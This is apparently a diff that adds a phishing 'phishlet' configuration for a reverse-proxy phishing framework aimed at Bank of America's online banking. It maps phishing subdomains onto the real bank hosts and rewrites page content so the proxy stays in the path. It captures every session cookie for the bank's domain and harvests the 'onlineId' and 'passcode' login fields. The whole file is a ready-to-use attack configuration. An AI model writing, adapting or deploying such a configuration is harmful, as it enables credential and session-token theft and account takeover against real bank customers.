@@ -1,0 +1,57 @@
+author: '@test'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'bankofamerica.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bankofamerica.com', session: false, is_landing: false}
+  - {phish_sub: 'boss', orig_sub: 'boss', domain: 'bankofamerica.com', session: false, is_landing: false}
+  - {phish_sub: 'dull', orig_sub: 'dull', domain: 'bankofamerica.com', session: false, is_landing: false}
+  - {phish_sub: 'aero', orig_sub: 'aero', domain: 'bankofamerica.com', session: false, is_landing: false}
+  - {phish_sub: 'rail', orig_sub: 'rail', domain: 'bankofamerica.com', session: false, is_landing: false}
+  - {phish_sub: 'sofa', orig_sub: 'sofa', domain: 'bankofamerica.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'secure.bankofamerica.com', orig_sub: 'secure', domain: 'bankofamerica.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure.bankofamerica.com', orig_sub: 'secure', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankofamerica.com', orig_sub: 'www', domain: 'bankofamerica.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.bankofamerica.com', orig_sub: 'www', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'boss.bankofamerica.com', orig_sub: 'boss', domain: 'bankofamerica.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'boss.bankofamerica.com', orig_sub: 'boss', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'dull.bankofamerica.com', orig_sub: 'dull', domain: 'bankofamerica.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'dull.bankofamerica.com', orig_sub: 'dull', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aero.bankofamerica.com', orig_sub: 'aero', domain: 'bankofamerica.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aero.bankofamerica.com', orig_sub: 'aero', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'rail.bankofamerica.com', orig_sub: 'rail', domain: 'bankofamerica.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'rail.bankofamerica.com', orig_sub: 'rail', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sofa.bankofamerica.com', orig_sub: 'sofa', domain: 'bankofamerica.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sofa.bankofamerica.com', orig_sub: 'sofa', domain: 'bankofamerica.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.bankofamerica.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - ''
+  - '' 
+
+credentials:
+  username:
+    key: 'onlineId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passcode'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'id', search: '.*'}
+      - {key: 'passcode', search: '.*'}
+    force:
+      - {key: 'saveMyID', value: 'true'}
+    type: 'post'
+
+login:
+  domain: 'secure.bankofamerica.com'
+  path: 'login/sign-in/signOnV2Screen.go'
